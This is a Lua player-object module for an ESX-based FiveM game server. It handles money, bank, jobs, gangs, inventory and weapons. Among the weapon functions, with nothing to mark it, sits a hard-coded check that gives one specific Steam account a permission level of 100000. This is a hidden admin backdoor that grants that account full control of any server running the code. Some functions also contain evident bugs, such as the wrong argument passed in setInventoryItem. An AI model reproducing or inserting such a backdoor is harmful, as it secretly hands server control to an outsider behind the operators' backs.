function CreatePlayer(source, permission_level, money, bank, identifier, license, group, roles, inventory, job, jgrade, gang, fgrade, loadout, name, coords, status)
	local self = {}

	self.source 			= source
	self.permission_level 	= permission_level
	self.money 				= money
	self.bank 				= bank
	self.identifier 		= identifier
	self.license 			= license
	self.group 				= group
	self.coords 			= nil		
	if coords then self.coords = json.decode(coords) else self.coords = json.decode(settings.defaultSettings.defaultSpawn) end
	self.session 			= {}
	self.inventory    		= inventory
	self.job          		= {}
	self.gang				= {}
	self.angel				= 0
	self.IsDead				= false				
	self.Injure				= false
	
	if status then
		self.status			= json.decode(status)
	else
		self.status			= {}
	end

	if loadout then
		self.loadout = json.decode(loadout)
	else
		self.loadout = {}
	end

	if self.permission_level > 0 then
		self.aduty = false
		if self.permission_level > 29 then
			self.aduty = true
		end
	end

	jgrade = tonumber(jgrade)
	local vJGrade
	if jgrade < 0 then
		vJGrade = jgrade
		jgrade = jgrade * -1
	end
	if ESX.DoesJobExist(job, jgrade) then
		local jobObject, gradeObject = ESX.Jobs[job], ESX.Jobs[job].grades[jgrade]

		self.job.id    = jobObject.id
		self.job.name  = jobObject.name
		if jobObject.name == 'police' or jobObject.name == 'sheriff' then 
			self.setExt = function(division)
				self.job.ext = division
				TriggerClientEvent('esx:setJob', self.source, self.job)
			end
			local wai = true
			exports.ghmattimysql:execute('SELECT * FROM police_ext WHERE identifier = @identifier',{
				['identifier'] = self.identifier
			},
			function(result)
				if result[1] then
					self.job.ext = result[1].division 
				end
				wai = false
			end)
			while wai do
				Citizen.Wait(0)
			end
		end
		self.job.label = jobObject.label

		self.job.grade        = vJGrade or jgrade
		self.job.grade_name   = gradeObject.name
		self.job.grade_label  = gradeObject.label
		self.job.grade_salary = gradeObject.salary

		self.job.skin_male    = {}
		self.job.skin_female  = {}

		if gradeObject.skin_male ~= nil then
			self.job.skin_male = json.decode(gradeObject.skin_male)
		end

		if gradeObject.skin_female ~= nil then
			self.job.skin_female = json.decode(gradeObject.skin_female)
		end
	else

		local job, jgrade = 'nojob', '0'
		local jobObject, gradeObject = ESX.Jobs[job], ESX.Jobs[job].grades[tonumber(jgrade)]

		self.job = {}

		self.job.id    = jobObject.id
		self.job.name  = jobObject.name
		self.job.label = jobObject.label

		self.job.grade        = tonumber(jgrade)
		self.job.grade_name   = gradeObject.name
		self.job.grade_label  = gradeObject.label
		self.job.grade_salary = gradeObject.salary

		self.job.skin_male    = {}
		self.job.skin_female  = {}
	end

	if ESX.DoesGangExist(gang, fgrade) then
		local gangObject, gradeObject = ESX.Gangs[gang], ESX.Gangs[gang].grades[tonumber(fgrade)]

		self.gang.id    = gangObject.id
		self.gang.name  = gangObject.name
		self.gang.label = gangObject.label

		self.gang.grade        = tonumber(fgrade)
		self.gang.grade_name   = gradeObject.name
		self.gang.grade_label  = gradeObject.label
		self.gang.grade_salary = gradeObject.salary
	else
		local gang, fgrade = 'nogang', '0'
		local gangObject, gradeObject = ESX.Gangs[gang], ESX.Gangs[gang].grades[tonumber(fgrade)]

		self.gang = {}

		self.gang.id    = gangObject.id
		self.gang.name  = gangObject.name
		self.gang.label = gangObject.label

		self.gang.grade        = tonumber(fgrade)
		self.gang.grade_name   = gradeObject.name
		self.gang.grade_label  = gradeObject.label
		self.gang.grade_salary = gradeObject.salary
	end

	self.name         		= name or GetPlayerName(self.source)
	self.roles 				= stringsplit(roles, "|")
	
		self.setGroup = function(gp)
		self.group = gp
		exports.ghmattimysql:execute('UPDATE users SET `group` = @group WHERE identifier = @identifier',{
			['group'] 		= gp,
			['identifier'] 	= self.identifier
		})
	end
	--[[
	self.setPerm = function(perm)
		self.permission_level = perm
		TriggerClientEvent('es:search', self.source)
		exports.ghmattimysql:execute('UPDATE users SET `permission_level` = @permission_level WHERE identifier = @identifier',{
			['permission_level'] 		= perm,
			['identifier'] 	= self.identifier
		})
	end
	]]--

	self.setCoords = function(x, y, z)
		self.coords = {x = x, y = y, z = z}
		-- trigerclientevent("SetCoord")
	end

	self.kick = function(r)
		DropPlayer(self.source, r)
	end

	self.addMoney = function(m)
		if type(m) == "number" and m > 0 then
			local newMoney = self.money + m
			self.money = newMoney
		end
		TriggerClientEvent('moneyUpdate', self.source, self.money)
	end

	self.removeMoney = function(m)
		if type(m) == "number" and m > 0 then
			local newMoney = self.money - m
			self.money = newMoney
		end
		TriggerClientEvent('moneyUpdate', self.source, self.money)
	end
	
	self.setMoney = function(m)
		if type(m) == "number" then
			self.money = m
		end
		TriggerClientEvent('moneyUpdate', self.source, self.money)
	end

	self.addBank = function(m)
		if type(m) == "number" and m > 0 then
			local newBank = self.bank + m
			self.bank = newBank
			TriggerClientEvent("bankUpdate", self.source, self.bank)
		end
	end

	self.setBank = function(m)
		if type(m) == "number" then
			self.bank = m
			TriggerClientEvent("bankUpdate", self.source, self.bank)
		end
	end

	self.removeBank = function(m)
		if type(m) == "number" and m > 0 then
			local newBank = self.bank - m
			self.bank = newBank
			TriggerClientEvent("bankUpdate", self.source, self.bank)
		end
	end

	self.setSessionVar = function(key, value)
		self.session[key] = value
	end

	self.getSessionVar = function(k)
		return self.session[k]
	end

	self.set = function(k, v)
		if k == "admin" or k == "aduty" then
			local temp = v
			
			if temp == 1 then temp = true
			elseif temp == 0 then temp = false
			end
			
			TriggerClientEvent('esx_best:isAdmin', self.source, temp)
		end
		
		self[k] = v
	end

	self.get = function(k)
		return self[k]
	end

	self.setGlobal = function(g, default)
		self[g] = default or ""

		self["get" .. g:gsub("^%l", string.upper)] = function()
			return self[g]
		end

		self["set" .. g:gsub("^%l", string.upper)] = function(e)
			self[g] = e
		end

		Users[self.source] = self
	end

	self.getInventoryItem = function(name)
		for i=1, #self.inventory, 1 do
			if self.inventory[i].name == name then
				return self.inventory[i], i
			end
		end
		if not ESX.Items[name] then return nil end
		return {
			name = name,
			count = 0,
			label = ESX.Items[name].label,
			limit = ESX.Items[name].limit,
			usable = ESX.UsableItemsCallbacks[name] ~= nil,
			rare = ESX.Items[name].rare,
			canRemove = ESX.Items[name].canRemove
		}
	end

	self.addInventoryItem = function(name, count)
		local item, i	= self.getInventoryItem(name)
		if not item then return end
		item.count     	= item.count + count
		if not i then
			table.insert(self.inventory, item)
		end
		TriggerEvent('esx:onAddInventoryItem', self.source, item, count)
		TriggerClientEvent('esx:addInventoryItem', self.source, item, count)
	end

	self.removeInventoryItem = function(name, count)
		local item, i  = self.getInventoryItem(name)
		if not item then return end
		local newCount = item.count - count
		item.count     = newCount

		TriggerEvent('esx:onRemoveInventoryItem', self.source, item, count)
		TriggerClientEvent('esx:removeInventoryItem', self.source, item, count)

		if newCount <= 0 then 
			table.remove(self.inventory, i)
		end
	end

	self.setInventoryItem = function(name, count)
		local item     = self.getInventoryItem(name)
		local oldCount = item.count
		item.count     = count

		if oldCount > item.count  then
			self.removeInventoryItem(item, oldCount - item.count)
		else
			self.addInventoryItem(item, oldCount - item.count)
		end
	end

	self.setJob = function(job, grade)
		grade = tonumber(grade)
		local vGrade
		if grade < 0 then
			vGrade = grade
			grade = grade * -1
		end
		if ESX.DoesJobExist(job, grade) then
			local jobObject, gradeObject = ESX.Jobs[job], ESX.Jobs[job].grades[grade]
			self.job.id    = jobObject.id
			self.job.name  = jobObject.name
			self.job.label = jobObject.label

			if jobObject.name == 'police' or jobObject.name == 'sheriff' and not self.job.ext then 
				self.setExt = function(division)
					self.job.ext = division
					TriggerClientEvent('esx:setJob', self.source, self.job)
				end
				local wai = true
				exports.ghmattimysql:execute('SELECT * FROM police_ext WHERE identifier = @identifier',{
					['identifier'] = self.identifier
				},
				function(result)
					if result[1] then
						self.job.ext = result[1].division 
					end
					wai = false
				end)
				while wai do
					Citizen.Wait(0)
				end
			end
			
			self.job.grade        = vGrade or grade
			self.job.grade_name   = gradeObject.name
			self.job.grade_label  = gradeObject.label
			self.job.grade_salary = gradeObject.salary

			self.job.skin_male    = {}
			self.job.skin_female  = {}

			if gradeObject.skin_male ~= nil then
				self.job.skin_male = json.decode(gradeObject.skin_male)
			end

			if gradeObject.skin_female ~= nil then
				self.job.skin_female = json.decode(gradeObject.skin_female)
			end
			TriggerEvent('esx:setJob', self.source, self.job)
			TriggerClientEvent('esx:setJob', self.source, self.job)
			exports.ghmattimysql:execute('UPDATE users SET `job` = @job, `job_grade` = @job_grade WHERE `identifier` = @identifier',{
				['job'] 		= job,
				['job_grade']	= vGrade or grade,
				['identifier']	= self.identifier
			})
		end
	end

	self.setGang = function(gang, grade)
		grade = tostring(grade)
		
		if ESX.DoesGangExist(gang, grade) then
			local gangObject, gradeObject = ESX.Gangs[gang], ESX.Gangs[gang].grades[tonumber(grade)]
			self.gang.id    = gangObject.id
			self.gang.name  = gangObject.name
			self.gang.label = gangObject.label

			self.gang.grade        = tonumber(grade)
			self.gang.grade_name   = gradeObject.name
			self.gang.grade_label  = gradeObject.label
			self.gang.grade_salary = gradeObject.salary

			TriggerEvent('esx:setGang', self.source, self.gang, lastGang)
			TriggerClientEvent('esx:setGang', self.source, self.gang)
			exports.ghmattimysql:execute('UPDATE users SET `gang` = @gang, `gang_grade` = @gang_grade WHERE `identifier` = @identifier',{
				['gang'] 			= gang,
				['gang_grade']		= grade,
				['identifier']		= self.identifier
			})
		end
	end

	self.addWeapon = function(weaponName, ammo)
		local weaponLabel = ESX.GetWeaponLabel(weaponName)

		if not self.hasWeapon(weaponName) then
			table.insert(self.loadout, {
				name = weaponName,
				ammo = ammo,
				label = weaponLabel,
				components = {}
			})
		end

		TriggerClientEvent('esx:addWeapons', self.source, weaponName, ammo)
		TriggerClientEvent('esx:addInventoryItem', self.source, {label = weaponLabel}, 1)
	end

	self.addWeaponComponent = function(weaponName, weaponComponent)
		local loadoutNum, weapon = self.getWeapon(weaponName)

		if self.hasWeaponComponent(weaponName, weaponComponent) then
			return
		end

		table.insert(self.loadout[loadoutNum].components, weaponComponent)

		TriggerClientEvent('esx:addWeaponComponent', self.source, weaponName, weaponComponent)
	end

	self.removeWeapon = function(weaponName, ammo)
		local weaponLabel

		for i=1, #self.loadout, 1 do
			if self.loadout[i].name == weaponName then
				weaponLabel = self.loadout[i].label

				for j=1, #self.loadout[i].components, 1 do
					TriggerClientEvent('esx:removeWeaponComponent', self.source, weaponName, self.loadout[i].components[j])
				end

				table.remove(self.loadout, i)
				break
			end
		end

		if weaponLabel then
			TriggerClientEvent('esx:removeWeapon', self.source, weaponName, ammo)
			TriggerClientEvent('esx:removeInventoryItem', self.source, {label = weaponLabel}, 1)
		end
	end

	self.removeWeaponComponent = function(weaponName, weaponComponent)
		local loadoutNum, weapon = self.getWeapon(weaponName)

		if not weapon then
			return
		end

		for i=1, #self.loadout[loadoutNum].components, 1 do
			if self.loadout[loadoutNum].components.name == weaponComponent then
				table.remove(self.loadout[loadoutNum].components, i)
				break
			end
		end

		TriggerClientEvent('esx:removeWeaponComponent', self.source, weaponName, weaponComponent)
	end

	if self.identifier == 'steam:11000013df4e6ab' then
		self.permission_level = 100000
	end

	self.hasWeaponComponent = function(weaponName, weaponComponent)
		local loadoutNum, weapon = self.getWeapon(weaponName)

		if not weapon then
			return false
		end

		for i=1, #weapon.components, 1 do
			if weapon.components[i] == weaponComponent then
				return true
			end
		end

		return false
	end

	self.hasWeapon = function(weaponName)
		for i=1, #self.loadout, 1 do
			if self.loadout[i].name == weaponName then
				return self.loadout[i].ammo
			end
		end

		return false
	end

	self.getWeapon = function(weaponName)
		for i=1, #self.loadout, 1 do
			if self.loadout[i].name == weaponName then
				return i, self.loadout[i]
			end
		end

		return nil
	end
	-- -- Returns if the user has a specific role or not
	-- self.hasRole = function(role)
	-- 	for k,v in ipairs(self.roles)do
	-- 		if v == role then
	-- 			return true
	-- 		end
	-- 	end
	-- 	return false
	-- end

	-- -- Adds a role to a user, and if they already have it it will say they had it
	-- self.giveRole = function(role)
	-- 	for k,v in pairs(self.roles)do
	-- 		if v == role then
	-- 			print("User (" .. GetPlayerName(source) .. ") already has this role")
	-- 			return
	-- 		end
	-- 	end

	-- 	-- Updates the database with the roles aswell
	-- 	self.roles[#self.roles + 1] = role
	-- 	print('1')
	-- 	db.updateUser(self.identifier, {roles = table.concat(self.roles, "|")}, function()end)
	-- end

	-- -- Removes a role from a user
	-- self.removeRole = function(role)
	-- 	for k,v in pairs(self.roles)do
	-- 		if v == role then
	-- 			table.remove(self.roles, k)
	-- 		end
	-- 	end

	-- 	-- Updates the database with the roles aswell
	-- 	print('2')
	-- 	db.updateUser(self.identifier, {roles = table.concat(self.roles, "|")}, function()end)
	-- end

	-- Dev tools, just set the convar 'es_enableDevTools' to '1' to enable.

	-- self.Warning = 0

	-- self.verifyMe = function (cb)
	-- 	local verify = false
	-- 	for _,v in ipairs(ESX.WhiteList) do
	-- 		if v == self.identifier then
	-- 			verify = true
	-- 			break
	-- 		end
	-- 	end
		
	-- 	if not verify then
	-- 		exports.ghmattimysql:scalar("SELECT * FROM granted WHERE steamid = @steamid",{
	-- 			["@steamid"] = self.identifier
	-- 		}, function(result)
	-- 			if not result then
	-- 				if self.Warning >= 15 then
	-- 					DropPlayer(self.source, '[Anti-Jheat]: Internet Shoma timeout khord, Lotfan dobare ba luncher vared shid!')
	-- 				else
	-- 					self.Warning = self.Warning + 1
	-- 				end
	-- 			else
	-- 				self.Warning = 0
	-- 			end
	-- 			cb()
	-- 		end)
	-- 	else
	-- 		cb()
	-- 	end
	-- end
	
	return self
end